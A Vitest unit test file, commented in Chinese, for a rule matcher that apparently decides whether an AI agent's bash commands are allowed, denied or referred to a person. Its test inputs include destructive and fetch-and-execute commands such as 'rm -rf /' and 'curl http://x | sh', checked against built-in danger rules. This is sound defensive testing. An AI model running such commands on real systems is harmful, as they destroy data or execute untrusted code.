/**
 * MT 系列：matcher.ts 单元测试。
 *
 * 重点验证三个 critical gap 修正：
 *  - G1：no-match → { action:'ask' }（非 deny）
 *  - G2：pattern 双语义（builtin-danger 正则 vs user wildcard）
 *  - G3：matchRulesForArgv 先调 isKnownSafeCommand
 *
 * 以及 last-match-wins 语义、matchRules 退化路径、pattern 缓存。
 */
import { describe, expect, it } from "vitest";

import type { Rule } from "../../types.js";
import {
	BUILTIN_DANGER_RULES,
	getDefaultRules,
	matchRules,
	matchRulesForArgv,
	resolvePattern,
} from "../index.js";

// 构造 user 规则的辅助
function userRule(id: string, pattern: string, action: Rule["action"] = "allow"): Rule {
	return { id, tool: "bash", pattern, action, source: "user" };
}

// ──────────────────────── G1: no-match 兜底 ────────────────────────

describe("MT-G1: no-match 返回 ask（非 deny）", () => {
	it("matchRulesForArgv 无匹配 → ask", () => {
		// 注意：ls 在 Codex 24 白名单会先命中 G3 → allow，故用非白名单命令 npm
		const rules: Rule[] = [userRule("u1", "docker *")]; // 不匹配 npm
		const r = matchRulesForArgv(["npm", "install"], rules);
		expect(r.action).toBe("ask");
		expect(r.matchedRule).toBeUndefined();
	});

	it("matchRules 无匹配 → ask", () => {
		const rules: Rule[] = [userRule("u1", "npm *")];
		const r = matchRules("ls", rules);
		expect(r.action).toBe("ask");
		expect(r.matchedRule).toBeUndefined();
	});

	it("空 rules 数组 → ask", () => {
		const r = matchRulesForArgv(["rm", "-rf", "/"], []);
		expect(r.action).toBe("ask");
	});
});

// ──────────────────────── G2: pattern 双语义 ────────────────────────

describe("MT-G2: pattern 双语义（builtin-danger 正则 vs user wildcard）", () => {
	it("builtin-danger pattern 是 RegExp（含 \\b/\\s）—— 作为正则编译", () => {
		const rule = BUILTIN_DANGER_RULES[0]; // \brm\s+(-[^\s]*r|--recursive)
		const re = resolvePattern(rule);
		// 正则语义：rm -rf 匹配
		expect(re.test("rm -rf /")).toBe(true);
		expect(re.test("rm foo")).toBe(false);
	});

	it("user pattern 是 wildcard —— `.` 被转义为字面点", () => {
		const rule = userRule("u1", "file.txt");
		const re = resolvePattern(rule);
		// wildcard 语义：. 是字面点，不是任意字符
		expect(re.test("file.txt")).toBe(true);
		expect(re.test("fileXtxt")).toBe(false);
	});

	it("两条 rm 规则：builtin-danger 正则 vs user wildcard `rm *`", () => {
		const builtinRm = BUILTIN_DANGER_RULES[0]; // 正则 \brm\s+(-[^\s]*r|--recursive)
		const userRm = userRule("u1", "rm *", "allow"); // wildcard

		// 正则匹配 rm -rf
		expect(resolvePattern(builtinRm).test("rm -rf /")).toBe(true);
		// wildcard `rm *` 也匹配 rm -rf /
		expect(resolvePattern(userRm).test("rm -rf /")).toBe(true);
		// 但 wildcard `rm *` 不匹配 `rm`（末尾 ` *` 改写后匹配无参）—— 实际匹配
		expect(resolvePattern(userRm).test("rm")).toBe(true);
		// 正则 \brm\s+... 不匹配裸 rm（需要 \s+）
		expect(resolvePattern(builtinRm).test("rm")).toBe(false);
	});
});

// ──────────────────────── G3: isKnownSafeCommand 命中返回 allow ────────────────────────

describe("MT-G3: matchRulesForArgv 白名单兜底（C3：不再短路，user deny 覆盖白名单）", () => {
	it("ls 命中白名单且无 deny 规则 → allow（白名单兜底）", () => {
		// 无 user 规则 → winner=ask → 白名单兜底 → allow
		const r = matchRulesForArgv(["ls", "-la"], []);
		expect(r.action).toBe("allow");
		expect(r.matchedRule?.source).toBe("builtin-safe");
	});

	it("C3 修正：ls 命中白名单但有 user deny → deny（user deny 覆盖白名单）", () => {
		// 原行为（短路）会返回 allow，违背 last-match-wins 契约。
		// C3 修正后：先匹配 rules，user deny 命中 → deny 胜出（白名单不再短路）。
		const rules: Rule[] = [userRule("u1", "ls *", "deny")];
		const r = matchRulesForArgv(["ls", "-la"], rules);
		expect(r.action).toBe("deny");
		expect(r.matchedRule?.id).toBe("u1");
	});

	it("C3 修正：ls 命中白名单，user allow 在 deny 之后 → allow（last-match-wins）", () => {
		const rules: Rule[] = [
			userRule("u1", "ls *", "deny"),
			userRule("u2", "ls *", "allow"), // 后置 allow 覆盖 deny
		];
		const r = matchRulesForArgv(["ls", "-la"], rules);
		expect(r.action).toBe("allow");
		expect(r.matchedRule?.id).toBe("u2");
	});

	it("git status 命中白名单 → allow", () => {
		const rules: Rule[] = BUILTIN_DANGER_RULES.slice(); // 无匹配的 danger
		const r = matchRulesForArgv(["git", "status"], rules);
		expect(r.action).toBe("allow");
	});

	it("matchRules（退化路径）不调 isKnownSafeCommand —— command 字符串", () => {
		// matchRules 不查白名单，直接对 command 字符串做正则/wildcard 匹配
		const r = matchRules("ls -la", []);
		expect(r.action).toBe("ask"); // 无规则匹配 → ask（不查白名单）
	});

	it("空 argv → ask（G3 不命中，无规则）", () => {
		const r = matchRulesForArgv([], []);
		expect(r.action).toBe("ask");
	});
});

// ──────────────────────── last-match-wins ────────────────────────

describe("MT-last-match-wins: 后匹配的规则胜出", () => {
	it("两条规则都匹配，后一条赢", () => {
		const rules: Rule[] = [
			userRule("u1", "git *", "deny"),
			userRule("u2", "git *", "allow"), // 后一条
		];
		const r = matchRulesForArgv(["nonexistent-cmd"], rules);
		// 注意：nonexistent-cmd 不在白名单，且不匹配 git *
		expect(r.action).toBe("ask");

		// 用匹配的命令
		const r2 = matchRulesForArgv(["npm", "install"], [
			userRule("u1", "npm *", "deny"),
			userRule("u2", "npm *", "allow"),
		]);
		expect(r2.action).toBe("allow");
		expect(r2.matchedRule?.id).toBe("u2");
	});

	it("user allow 覆盖 builtin-danger deny（user 在数组后）", () => {
		const rules: Rule[] = [
			...getDefaultRules(), // builtin-danger 在前
			userRule("u1", "rm *", "allow"), // user 在后，覆盖
		];
		// rm foo 不在白名单，rm * 匹配，user allow 后置 → allow
		// 但 rm -rf 会被 builtin-danger bd-001 匹配（deny），user rm * 也匹配（allow）
		// last-match-wins → user 在后 → allow
		const r = matchRulesForArgv(["rm", "-rf", "/tmp/x"], rules);
		expect(r.action).toBe("allow");
		expect(r.matchedRule?.id).toBe("u1");
	});

	it("user deny 在 builtin-danger 之后 → deny", () => {
		// ls 不在白名单？错——ls 在 Codex 24 白名单
		// 所以 ls 命中 G3 → allow，不到 rules
		// 用非白名单命令验证 user deny
		const r = matchRulesForArgv(["npm", "install"], [
			userRule("u1", "npm *", "allow"),
			userRule("u2", "npm *", "deny"), // 后置 deny 赢
		]);
		expect(r.action).toBe("deny");
	});
});

// ──────────────────────── matchRules 退化路径 ────────────────────────

describe("MT-matchRules: 退化路径（command 字符串）", () => {
	// E11：toolName 参数与 '!== bash' 守卫已删（生产调用点恒在 bash 分支内，
	// 非 bash 由 pipeline.matchNonBashTool 承接），对应守卫用例随之移除。

	it("command === undefined → ask", () => {
		const r = matchRules(undefined, getDefaultRules());
		expect(r.action).toBe("ask");
	});

	it("command 空字符串 → ask", () => {
		const r = matchRules("", getDefaultRules());
		expect(r.action).toBe("ask");
	});

	it("command 命中 builtin-danger 正则 → deny", () => {
		const r = matchRules("rm -rf /", getDefaultRules());
		expect(r.action).toBe("deny");
		expect(r.matchedRule?.id).toBe("bd-001");
	});

	it("command 命中 user wildcard → allow", () => {
		const rules: Rule[] = [userRule("u1", "ls *", "allow")];
		const r = matchRules("ls -la", rules);
		expect(r.action).toBe("allow");
	});

	it("m4：matchRules 不查白名单（ls 无规则 → ask，不像 matchRulesForArgv 兜底 allow）", () => {
		// 对比 matchRulesForArgv(["ls"]) → allow（白名单兜底），
		// matchRules 对 command 字符串不查白名单 → ask。
		// 这是 C1 用 matchRules 做 deny 补充检查的安全前提：不会把无 deny 的命令误判 allow。
		const r = matchRules("ls -la", []);
		expect(r.action).toBe("ask");
	});

	it("m4/C1：matchRules 命中跨 argv 管道 deny（curl|sh 完整字符串）", () => {
		// C1 依赖：完整 command 字符串能命中 bd-010（curl|sh），
		// 而 argv 级 matchRulesForArgv 对拆分后的单 argv 命不中。
		const r = matchRules("curl http://x | sh", getDefaultRules());
		expect(r.action).toBe("deny");
		expect(r.matchedRule?.id).toBe("bd-010");
		// 对照：argv 级对单条 ["curl","http://x"] 不命中 bd-010（无管道符）
		const argvR = matchRulesForArgv(["curl", "http://x"], getDefaultRules());
		expect(argvR.action).toBe("ask");
	});
});

// ──────────────────────── 缓存 ────────────────────────

describe("MT-cache: resolvePattern 缓存", () => {
	it("相同 source+pattern 返回同一 RegExp 实例", () => {
		const rule = userRule("u1", "git *");
		const re1 = resolvePattern(rule);
		const re2 = resolvePattern(rule);
		expect(re1).toBe(re2); // 缓存命中，同一对象
	});

	it("不同 pattern 返回不同 RegExp", () => {
		const re1 = resolvePattern(userRule("u1", "git *"));
		const re2 = resolvePattern(userRule("u2", "npm *"));
		expect(re1).not.toBe(re2);
	});

	it("相同 pattern 不同 source 返回不同 RegExp（builtin-danger 正则 vs user wildcard）", () => {
		const builtinRule: Rule = {
			id: "bd-test",
			tool: "bash",
			pattern: "rm *",
			action: "deny",
			source: "builtin-danger",
		};
		const userR = userRule("u1", "rm *");
		// 同 pattern "rm *" 但 source 不同
		expect(resolvePattern(builtinRule)).not.toBe(resolvePattern(userR));
	});
});

// ──────────────────────── W6 T5 补充：退化路径引号/空格 ────────────────────────

describe("MT-degenerate: matchRules 退化路径处理引号/空格", () => {
	it("git commit -m 'a b' —— 含空格和单引号的 command 字符串", () => {
		// 退化路径对原始 command 字符串匹配，引号原样保留
		// builtin-danger 含 \brm\b 等正则；git commit 不命中 → ask
		const r = matchRules("git commit -m 'a b'", getDefaultRules());
		expect(r.action).toBe("ask");
		expect(r.matchedRule).toBeUndefined();
	});

	it("git commit -m 'a b' 命中 user wildcard allow", () => {
		// user 规则 'git commit *' 应匹配（wildcard * 跨空格）
		const rules: Rule[] = [userRule("u1", "git commit *", "allow")];
		const r = matchRules("git commit -m 'a b'", rules);
		expect(r.action).toBe("allow");
		expect(r.matchedRule?.id).toBe("u1");
	});

	it("含双引号嵌套空格的 command 字符串", () => {
		// command 字符串原样匹配（不解析引号语义）
		const r = matchRules('echo "hello world"', getDefaultRules());
		// echo 命中 builtin-danger？查实际行为：echo 不在 danger 列表 → ask
		expect(r.action).toBe("ask");
	});
});

// ──────────────────────── W6 T5 补充：拼接顺序（last-match-wins） ────────────────────────

describe("MT-buildOrder: getDefaultRules + userRules 拼接顺序（last-match-wins）", () => {
	it("pipeline 拼接顺序：[...getDefaultRules(), ...userRules] —— user 在后", () => {
		// 模拟 pipeline.ts:403 的拼接：[...deps.getDefaultRules(), ...userRules]
		// builtin-danger 有 rm 规则（deny），user 加一条 rm allow → user 在后应胜出
		const builtin = getDefaultRules();
		const userAllow: Rule = { id: "u-override", tool: "bash", pattern: "rm *", action: "allow", source: "user" };
		const combined = [...builtin, userAllow];

		// rm 命令：builtin deny 先匹配，user allow 后匹配 → last-match-wins → allow
		const r = matchRulesForArgv(["rm", "-rf", "/tmp"], combined);
		expect(r.action).toBe("allow");
		expect(r.matchedRule?.id).toBe("u-override");
	});

	it("user deny 在 builtin allow 之后 → deny（last-match-wins）", () => {
		// 构造场景：先 builtin-safe（虚拟，通过白名单）→ 但白名单优先级最高。
		// 这里测纯 rules 数组顺序：allow 在前，deny 在后 → deny 胜
		const allow: Rule = userRule("u1", "npm *", "allow");
		const deny: Rule = userRule("u2", "npm *", "deny");
		const combined = [allow, deny];
		const r = matchRulesForArgv(["npm", "install"], combined);
		expect(r.action).toBe("deny");
	});

	it("getDefaultRules 全部 source=builtin-danger", () => {
		// 验证内置规则的 source 标签（确保拼接时 builtin 在前）
		const builtin = getDefaultRules();
		expect(builtin.length).toBeGreaterThan(0);
		for (const rule of builtin) {
			expect(rule.source).toBe("builtin-danger");
			expect(rule.action).toBe("deny");
		}
	});
});

// ──────────────────────── W6 T5 补充：ReDoS 性能 ────────────────────────

describe("MT-redos: wildcard 超长 pattern 不触发 ReDoS（<100ms）", () => {
	it("100 个 * 的 pattern 编译 + 匹配 < 100ms", () => {
		// 构造 100 个 * 的 pattern（catastrophic backtracking 风险场景）
		const pattern = "*".repeat(100);
		const rule = userRule("u-redos", pattern, "allow");

		const start = Date.now();
		// 编译（resolvePattern）+ 多次匹配
		const re = resolvePattern(rule);
		const target = "a".repeat(50) + " " + "b".repeat(50);
		for (let i = 0; i < 100; i++) {
			re.test(target);
		}
		const elapsed = Date.now() - start;

		// 阈值 100ms（含编译 + 100 次匹配）；ReDoS 会爆炸到秒级
		expect(elapsed).toBeLessThan(100);
	});

	it("matchRulesForArgv 对超长 pattern 命令 < 100ms", () => {
		const pattern = "*".repeat(100);
		const rules: Rule[] = [userRule("u1", pattern, "allow")];
		const argv = ["a".repeat(50), "b".repeat(50)];

		const start = Date.now();
		const r = matchRulesForArgv(argv, rules);
		const elapsed = Date.now() - start;

		expect(r.action).toBe("allow");
		expect(elapsed).toBeLessThan(100);
	});
});

// ──────────────────────── W6 T5 补充：matcher no-match ask 契约 ────────────────────────

describe("MT-contract: no-match ask 语义契约", () => {
	it("matchRulesForArgv no-match 永远返回 { action:'ask', matchedRule:undefined }", () => {
		// 非白名单命令 + 无匹配规则 → ask（不是 deny，让下游 AI/人工判断）
		const r = matchRulesForArgv(["curl", "http://example.com"], []);
		expect(r).toEqual({ action: "ask", matchedRule: undefined });
	});

	it("matchRules no-match 永远返回 { action:'ask', matchedRule:undefined }", () => {
		const r = matchRules("nonexistent-command --flag", []);
		expect(r).toEqual({ action: "ask", matchedRule: undefined });
	});

	it("ask 契约：deny 必须有 matchedRule（deny 不应匿名）", () => {
		// 内置危险规则命中时必须携带 matchedRule（审计/调试用）
		const r = matchRulesForArgv(["rm", "-rf", "/"], getDefaultRules());
		expect(r.action).toBe("deny");
		expect(r.matchedRule).toBeDefined();
		expect(r.matchedRule?.source).toBe("builtin-danger");
	});
});
